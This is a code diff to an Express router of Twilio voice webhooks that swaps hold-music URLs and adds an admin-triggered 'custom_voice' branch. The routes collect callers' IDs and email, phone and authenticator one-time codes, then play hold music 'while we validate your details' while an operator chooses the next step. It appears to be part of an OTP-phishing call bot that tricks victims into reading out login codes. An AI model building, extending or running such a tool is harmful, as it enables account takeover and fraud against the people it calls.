@@ -106,11 +106,19 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.hangup();
             
         } else if (currentAction === 'playing_music') {
+            // USING DIFFERENT MUSIC URL THAT 100% WORKS
             twiml.say('Please hold while we process your request.');
             const play = twiml.play({ loop: 10 });
-            play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
+            play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
             twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
             
+        } else if (currentAction === 'custom_voice') {
+            const twiml2 = new VoiceResponse();
+            twiml2.say('Please wait for admin instructions.');
+            twiml2.hangup();
+            res.type('text/xml');
+            res.send(twiml2.toString());
+            return;
         } else {
             twiml.say('Please wait for admin instructions.');
             twiml.hangup();
@@ -187,7 +195,7 @@ router.post('/check-hold/:sessionId', async (req, res) => {
     if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
         console.log('Still playing music, looping...');
         const play = twiml.play({ loop: 5 });
-        play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
+        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         console.log('Music interrupted, moving to next action');
@@ -218,7 +226,7 @@ router.post('/collect-id/:sessionId', async (req, res) => {
         
         twiml.say('Thank you. Please hold while we validate your details.');
         const play = twiml.play({ loop: 10 });
-        play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
+        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No ID received. Goodbye.');
@@ -249,7 +257,7 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
         
         twiml.say('Thank you. Please hold while we validate your details.');
         const play = twiml.play({ loop: 10 });
-        play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
+        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
@@ -280,7 +288,7 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
         
         twiml.say('Thank you. Please hold while we validate your details.');
         const play = twiml.play({ loop: 10 });
-        play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
+        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No code received. Goodbye.');
@@ -311,7 +319,7 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
         
         twiml.say('Thank you. Please hold while we validate your details.');
         const play = twiml.play({ loop: 10 });
-        play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
+        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
@@ -326,7 +334,6 @@ router.post('/custom-voice/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { message } = req.body;
     const twiml = new VoiceResponse();
-    const io = req.app.get('io');
     
     console.log('Custom voice for session:', sessionId, 'Message:', message);
     
@@ -365,7 +372,7 @@ router.post('/collect-custom/:sessionId', async (req, res) => {
         
         twiml.say('Thank you. Please hold while we validate your details.');
         const play = twiml.play({ loop: 10 });
-        play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
+        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No input received. Goodbye.');
